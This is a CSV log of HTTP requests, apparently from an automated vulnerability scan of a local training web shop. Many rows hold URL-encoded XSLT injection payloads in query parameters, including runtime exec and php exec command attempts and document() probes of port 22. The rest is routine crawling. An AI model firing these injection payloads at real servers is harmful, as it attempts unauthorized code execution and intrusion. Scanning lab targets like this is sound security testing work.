ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6644,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,200,92,18
6646,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=Pd9XKj-&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,213,230,40
6647,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,56,92,18
6648,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,500,Internal Server Error,446,362,421
6649,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,14,92,18
6650,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=websocket&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,38,92,18
6651,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,43,92,17
6652,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,5,92,17
6653,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3C&transport=polling&t=Pd9XKhr,200,OK,12,230,96
6654,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,21,92,17
6655,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&transport=polling&t=Pd9XKhr,200,OK,3,230,96
6656,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,4,92,17
6657,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=system-property%28%27xsl%3Avendor%27%29%2F%3E&transport=polling&t=Pd9XKhr,200,OK,2,230,96
6658,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=system-property%28%27xsl%3Avendor%27%29%2F%3E,500,Internal Server Error,242,362,371
6659,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKhr,200,OK,32,230,96
6660,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=Pd9XKhr,200,OK,27,230,96
6661,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E&transport=polling&t=Pd9XKhr,200,OK,14,230,96
6662,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=Pd9XKhr,200,OK,11,230,96
6663,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=Pd9XKhr,200,OK,8,230,96
6664,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3C&t=Pd9XKhr,400,Bad Request,1,230,40
6665,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=Pd9XKhr,400,Bad Request,71,230,40
6666,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,500,Internal Server Error,176,362,437
6667,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=Pd9XKhr,400,Bad Request,7,230,40
6668,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:50 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E,200,OK,498,384,30
6669,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/socket.io/?EIO=4&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=Pd9XKhr,400,Bad Request,67,230,40
6670,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,500,Internal Server Error,189,362,429
6671,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F192.168.8.101%3A22%27%29%22%2F%3E,500,Internal Server Error,142,362,435
6672,Thu Oct 09 23:25:50 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,411,384,30
6673,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,500,Internal Server Error,79,362,763
6674,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/rest/products/search?q=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,500,Internal Server Error,197,362,463
6675,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/api/Challenges/?name=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,284,384,30
6676,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000,200,OK,10,469,75002
6677,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,39,363,1823
6678,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:51 IST 2025,GET,http://192.168.8.101:3000/api/Challenges,200,OK,149,389,59080
6679,Thu Oct 09 23:25:51 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/api/Quantitys,304,Not Modified,124,306,0
6680,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/assets,301,Moved Permanently,5,416,156
6681,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/assets/i18n,301,Moved Permanently,5,421,161
6682,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/assets/public,301,Moved Permanently,9,423,163
6683,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/assets/public/images,301,Moved Permanently,9,430,170
6684,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/assets/public/images/products,301,Moved Permanently,4,439,179
6685,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/rest,500,Internal Server Error,7,363,1825
6686,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/rest/admin,500,Internal Server Error,39,363,1837
6687,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/rest/products,500,Internal Server Error,11,363,1843
6688,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/rest/products/1,500,Internal Server Error,10,363,1847
6689,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/rest/user,500,Internal Server Error,31,363,1835
6690,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000/socket.io,200,OK,34,469,75002
6691,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,4,230,41
6692,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,2,230,41
6693,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,5,230,41
6694,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,5,230,41
6696,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,8,230,41
6698,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,9,230,41
6699,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000,200,OK,9,469,75002
6700,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,11,230,41
6701,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,5,230,41
6703,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,6,230,41
6705,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,7,230,41
6702,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,GET,http://192.168.8.101:3000,200,OK,29,469,75002
6707,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:52 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,17,230,41
6708,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,206,230,41
6709,Thu Oct 09 23:25:52 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,213,469,75002
6710,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,9,230,41
6711,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,5,230,41
6713,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,18,230,41
6715,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,13,230,41
6716,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,16,469,75002
6717,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,3,230,41
6718,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LmoF&sid=j94n85-oECNedDJJAAAl,400,Bad Request,7,230,41
6719,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,16,469,75002
6720,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,7,469,75002
6721,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,106,469,75002
6722,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,9,469,75002
6723,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,11,469,75002
6724,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,6,469,75002
6725,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,12,469,75002
6726,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,8,230,41
6728,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,6,230,41
6730,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,13,469,75002
6731,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,19,469,75002
6732,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,8,469,75002
6733,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,6,469,75002
6734,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,12,469,75002
6735,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,14,469,75002
6736,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,10,469,75002
6737,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,18,469,75002
6738,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,28,469,75002
6739,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000,200,OK,36,469,75002
6740,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,39,469,75002
6741,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,7,469,75002
6742,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,17,469,75002
6743,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/,200,OK,9,469,75002
6744,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,7,363,1823
6745,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,108,431,60840
6746,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,93,363,1823
6747,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,117,230,41
6749,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,125,230,41
6751,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,51,363,1823
6753,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,35,363,1823
6752,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,90,431,60840
6754,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,39,363,1823
6755,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:53 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,22,363,1823
6756,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,16,230,41
6758,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,87,363,1823
6760,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,38,230,41
6759,Thu Oct 09 23:25:53 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,151,431,60840
6762,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,15,363,1823
6763,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,34,431,60840
6764,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,18,363,1823
6765,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,24,363,1823
6766,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,13,363,1823
6767,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,240,363,1823
6768,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,380,230,41
6771,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,411,230,41
6770,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,481,431,60840
6773,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/api,500,Internal Server Error,234,363,1823
6774,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,51,230,41
6776,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,GET,http://192.168.8.101:3000/MaterialIcons-Regular.woff2,200,OK,28,431,60840
6777,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,7,230,41
6780,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9LhnU&sid=j94n85-oECNedDJJAAAl,400,Bad Request,5,230,41
6782,Thu Oct 09 23:25:54 IST 2025,Thu Oct 09 23:25:54 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,3,230,41
6784,Thu Oct 09 23:25:55 IST 2025,Thu Oct 09 23:25:55 IST 2025,POST,http://192.168.8.101:3000/socket.io/?EIO=4&transport=polling&t=Pd9XKjD&sid=CWfaRYAgm9i8v88hAAAx,400,Bad Request,16,230,41
